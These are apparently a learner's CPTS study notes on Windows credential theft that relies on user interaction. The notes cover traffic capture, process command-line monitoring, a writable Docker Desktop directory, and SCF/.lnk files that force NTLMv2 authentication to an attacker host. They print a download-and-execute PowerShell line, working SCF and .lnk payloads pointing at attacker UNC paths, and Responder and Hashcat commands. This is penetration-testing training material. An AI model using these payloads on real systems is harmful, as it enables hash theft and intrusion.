This section focuses on a different privilege-escalation/credential-theft angle: **instead of attacking the OS directly, abuse situations where a legitimate user interacts with something you control**. The source highlights traffic capture, process command lines, vulnerable applications, malicious SCF files, and malicious `.lnk` files.

---

# 1. Core Concept — Users as an Attack Surface

A user may be the weakest link because they can:

- Browse a shared drive
    
- Click a link
    
- Open a file
    
- Run an application
    
- Authenticate to a resource
    

From a pentesting perspective, this creates opportunities to obtain:

```text
Credentials
     ↓
Password hashes
     ↓
Cleartext passwords
     ↓
Access tokens / sessions
     ↓
Lateral movement
     ↓
Privilege escalation
```

The important mindset is:

> **If direct privilege escalation is exhausted, look for opportunities where another user performs an action that causes authentication or credential disclosure.**

The source specifically highlights placing malicious files on heavily accessed shares to obtain password hashes for offline cracking.

---

# 2. Traffic Capture

## Wireshark

If Wireshark is installed on a compromised Windows host, check whether the current user can capture traffic.

The source notes that unprivileged users may sometimes be able to capture traffic because the Npcap option restricting driver access to Administrators is **not enabled by default**.

### Why this matters

If another user on the same machine is using an insecure protocol, credentials may appear in plaintext.

The source demonstrates FTP:

```text
USER root
PASS FTP_adm1n!
```

captured through Wireshark.

### CPTS workflow

```text
Land on Windows host
       ↓
Check installed applications
       ↓
Wireshark/Npcap present?
       ↓
Can current user capture?
       ↓
Capture traffic
       ↓
Look for insecure protocols
       ↓
Credentials / hashes
       ↓
Validate access
```

### Important

This is particularly valuable for protocols where credentials aren't protected by encryption.

Think:

```text
FTP
HTTP
Telnet
SMB authentication
Other legacy/insecure protocols
```

---

# 3. Capture Traffic from an Attack Machine

If you have an attack machine positioned inside the target environment, the source recommends:

```text
tcpdump
Wireshark
net-creds
```

The idea is to monitor traffic for credentials or hashes.

The source specifically mentions `net-creds`, which can process:

- Live interfaces
    
- PCAP files
    

and extract potentially useful credentials for privilege escalation or lateral movement.

### Mental model

```text
Network traffic
      │
      ▼
   Capture
      │
      ▼
   Analyze
      │
      ├── Cleartext credentials
      ├── Password hashes
      └── Authentication material
```

---

# 4. Process Command Lines

This is **very important for CPTS**.

When you obtain a shell as a user, other processes may be running commands containing credentials.

For example:

```text
application.exe --username bob --password Password123
```

or:

```text
net use T: \\server\share /user:DOMAIN\user Password123
```

The password can therefore be exposed through the process command line.

The source specifically recommends monitoring process command lines because scheduled tasks or other processes may pass credentials this way.

---

# 5. Process Command-Line Monitoring Script

The source uses:

```powershell
while($true)
{
    $process = Get-WmiObject Win32_Process | Select-Object CommandLine
    Start-Sleep 1
    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
    Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

### What is happening?

Every cycle:

```text
Get process command lines
        ↓
Wait 1 second
        ↓
Get process command lines again
        ↓
Compare old vs new
        ↓
Display changes
```

This is effectively a lightweight process-command-line monitor.

---

# 6. Running the Monitor from Your Attack Machine

The source hosts the PowerShell script remotely:

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

The script then produces newly observed command lines.

One particularly interesting result is:

```text
net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
```

This exposes:

```text
Username:
inlanefreight\sqlsvc

Password:
My4dm1nP@s5w0Rd
```

The source notes that the credentials could potentially provide access to SQL02 or sensitive information on the `backups` share.

### 🔥 CPTS takeaway

**Always inspect command lines.**

A credential doesn't have to be stored in:

```text
password.txt
web.config
registry
```

It may exist only briefly in:

```text
Process command line
```

---

# 7. Vulnerable Services + User Interaction

Another scenario:

You land on a machine running vulnerable third-party software.

The vulnerability may require:

```text
User action
OR
Application restart
OR
User authentication
```

The source uses **Docker Desktop Community Edition before 2.1.0.1** as an example.

The vulnerable application searches for files such as:

```text
docker-credential-wincred.exe
docker-credential-wincred.bat
```

inside:

```text
C:\PROGRAMDATA\DockerDesktop\version-bin\
```

The directory was misconfigured with full write access for:

```text
BUILTIN\Users
```

Therefore an authenticated user could place a malicious executable there.

---

# 8. The Important Part — Trigger Conditions

The planted executable runs when:

```text
Docker application starts
```

or:

```text
A user performs docker login
```

So this isn't necessarily:

```text
Exploit → instant SYSTEM
```

Instead:

```text
Weak application
      ↓
Writable directory
      ↓
Plant malicious executable
      ↓
Wait for trigger
      ↓
User/application action
      ↓
Code execution
      ↓
Potential privilege escalation
```

The source explicitly notes that the vulnerability did not guarantee elevated access because it depended on a service restart or user action.

### CPTS lesson

When enumerating installed software, ask:

> **What does this application load, and from where?**

This connects directly to the **DLL hijacking / weak permissions** topics you already studied.

---

# 9. SCF on a File Share

This is one of the most important techniques in this section.

## What is SCF?

SCF = **Shell Command File**.

Windows Explorer uses SCF files for actions such as:

- Moving between directories
    
- Showing the Desktop
    
- Other Explorer functionality
    

The source explains that an SCF file can be manipulated so its `IconFile` points to a UNC path. When Explorer accesses the directory containing the SCF file, Windows may initiate an SMB authentication attempt to that remote server.

---

# 10. SCF Attack Chain

The mental model:

```text
Writable network share
        ↓
Place malicious .scf
        ↓
User browses share
        ↓
Explorer processes SCF
        ↓
SCF references attacker SMB server
        ↓
Windows attempts authentication
        ↓
NTLMv2 challenge/response captured
        ↓
Offline cracking
        ↓
Recovered password
        ↓
Lateral movement / PrivEsc
```

The source specifically describes using:

- Responder
    
- Inveigh
    
- InveighZero
    

to capture NTLMv2 hashes.

---

# 11. Creating the Malicious SCF

The example uses:

```text
@Inventory.scf
```

The `@` helps place the file near the top of a directory listing so it is more likely to be noticed/processed when Explorer accesses the share.

Content:

```text
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico

[Taskbar]
Command=ToggleDesktop
```

### Critical field

```text
IconFile=\\ATTACKER_IP\share\legit.ico
```

That UNC reference causes Windows to attempt SMB authentication to the attacker's system when the file is processed.

---

# 12. Responder

The source then starts:

```bash
sudo responder -w -v -I tun0
```

Responder listens for authentication events and, in the example, captures an NTLMv2 response.

The example shows:

```text
[SMB] NTLMv2-SSP Client
[SMB] NTLMv2-SSP Username
[SMB] NTLMv2-SSP Hash
```

The captured identity is:

```text
WINLPE-SRV01\Administrator
```

### CPTS distinction

You are **not directly receiving the user's plaintext password**.

You're receiving an:

```text
NTLMv2 challenge-response
```

which can potentially be attacked offline.

---

# 13. Cracking NTLMv2 with Hashcat

The source uses Hashcat mode:

```text
5600
```

Command:

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

The example eventually recovers:

```text
Welcome1
```

and Hashcat identifies the hash as:

```text
NetNTLMv2
```

### Memorize

```text
NTLMv2 / NetNTLMv2
        ↓
Hashcat
        ↓
-m 5600
```

---

# 14. Important Timing Detail

The source notes that after starting Responder, you may need to wait:

```text
2–5 minutes
```

for the user to browse the share.

This teaches an important real-world pentesting concept:

> Some attacks depend on a **future user action**.

You don't necessarily get the credential immediately.

---

# 15. Malicious `.lnk` Files

SCF-based techniques no longer work on Server 2019 hosts according to the source.

An alternative is a malicious:

```text
.lnk
```

file.

This connects nicely with the **Citrix Breakout** section you just completed, where `.lnk` files were also discussed.

---

# 16. Creating a Malicious `.lnk`

The source demonstrates creating one using PowerShell:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Important line

```powershell
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
```

The shortcut references a remote UNC resource.

The source explains that browsing to the directory containing this file can trigger an authentication request.

---

# 🔥 SCF vs LNK

|Feature|SCF|LNK|
|---|---|---|
|File type|`.scf`|`.lnk`|
|Explorer interaction|Yes|Yes|
|Can reference UNC|Yes|Yes|
|Authentication trigger|Yes|Yes|
|Source example|`IconFile=`|`TargetPath=`|
|Server 2019|Source says SCF no longer works|Alternative|
|Typical goal|Capture NTLMv2|Trigger authentication|
|Tools|Responder/Inveigh|Lnkbomb / PowerShell|

---

# 🧠 Complete User-Interaction Attack Model

This entire section can be reduced to:

```text
             USER INTERACTION
                    │
        ┌───────────┼────────────┐
        │           │            │
        ▼           ▼            ▼
   Network       Process      Vulnerable
   Traffic       Command       Software
        │           │            │
        ▼           ▼            ▼
 Credentials     Passwords     Code Execution
 / Hashes        in CLI        Trigger
        │           │            │
        └───────────┼────────────┘
                    ▼
             Access / Creds
                    │
                    ▼
             PrivEsc / Lateral
                    │
                    ▼
                 Domain
```

---

# 🔥 CPTS Enumeration Checklist

When you land on a Windows host and direct PrivEsc paths are exhausted:

### Network

```text
□ Is Wireshark installed?
□ Can I capture packets?
□ Are insecure protocols being used?
□ Can I obtain a PCAP?
□ Can tcpdump/net-creds help?
```

### Processes

```text
□ What processes are running?
□ What are their command lines?
□ Are credentials passed as arguments?
□ Are scheduled tasks exposing passwords?
□ Are mapped drives using credentials?
```

### Applications

```text
□ What third-party software is installed?
□ Are there known vulnerable versions?
□ Does the application load files from writable locations?
□ Does it require user interaction?
□ Does restart/authentication trigger execution?
```

### File Shares

```text
□ Which shares are writable?
□ Which shares are heavily used?
□ Can users be expected to browse them?
□ Can a crafted file trigger authentication?
```

### Authentication Capture

```text
□ SCF possible?
□ LNK possible?
□ UNC path available?
□ Responder/Inveigh applicable?
□ NTLMv2 captured?
□ Can the hash be cracked offline?
```

---

# ⚡ Commands to Memorize

### Process command-line monitoring

```powershell
Get-WmiObject Win32_Process | Select-Object CommandLine
```

### Remote script execution from HTTP

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

### Responder

```bash
sudo responder -w -v -I tun0
```

### Hashcat — NetNTLMv2

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

### Create LNK

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Save()
```

---

# 🎯 What You Should Remember for CPTS

### **1. Credentials can exist temporarily**

Don't only search files and registry.

Check:

```text
Process command lines
Network traffic
Authentication attempts
```

---

### **2. User interaction is a privilege-escalation primitive**

A vulnerability may require:

```text
restart
login
opening application
browsing share
opening file
```

So if an exploit doesn't immediately execute, ask:

> **What user action triggers it?**

---

### **3. Writable shares are extremely interesting**

Especially:

```text
Writable
+
Heavily used
+
Users browse it
```

That combination should immediately make you think about **user-interaction attacks**.

---

### **4. UNC paths are a recurring theme**

You've now seen UNC paths in both:

**Citrix Breakout:**

```text
\\127.0.0.1\c$
\\ATTACKER_IP\share
```

and:

**Interacting with Users:**

```text
\\ATTACKER_IP\share\file
```

The common concept is:

```text
UNC path
   ↓
Windows attempts network access
   ↓
Potential authentication
   ↓
Credential material
```

---

## 🧩 Viva Questions

**Q1. Why monitor process command lines?**  
Because applications, scripts, scheduled tasks, and commands may expose credentials as command-line arguments.

**Q2. What Hashcat mode is used for NetNTLMv2 in this section?**

```text
5600
```

**Q3. What is SCF?**  
Shell Command File, a Windows Explorer-related file type that can be abused to cause authentication to an attacker-controlled UNC path.

**Q4. What does `IconFile` do in the malicious SCF example?**

```text
IconFile=\\ATTACKER_IP\share\legit.ico
```

It references a remote UNC resource, potentially causing an SMB authentication attempt when Explorer processes the file.

**Q5. What credential material is captured?**

```text
NTLMv2 challenge/response
```

**Q6. What tool is used in the source to capture it?**

```bash
Responder
```

**Q7. Why crack the captured hash offline?**  
Because the captured NTLMv2 response is not itself the plaintext password.

**Q8. What replaced the SCF technique in the source's Server 2019 example?**

```text
Malicious .lnk
```

**Q9. What is the key condition for the vulnerable Docker example?**

```text
Writable application directory
+
Application/user trigger
```

**Q10. What is the biggest lesson from this section?**

> **Don't only attack the machine. Attack the assumptions around how users, applications, shares, and authentication interact.**

This section fits directly into your CPTS privilege-escalation methodology:

```text
Initial Enumeration
       ↓
Permissions / Services / Privileges
       ↓
Credential Hunting
       ↓
Further Credential Theft
       ↓
User Interaction
       ↓
Credentials / Hashes / Execution
       ↓
Privilege Escalation
       ↓
Lateral Movement
```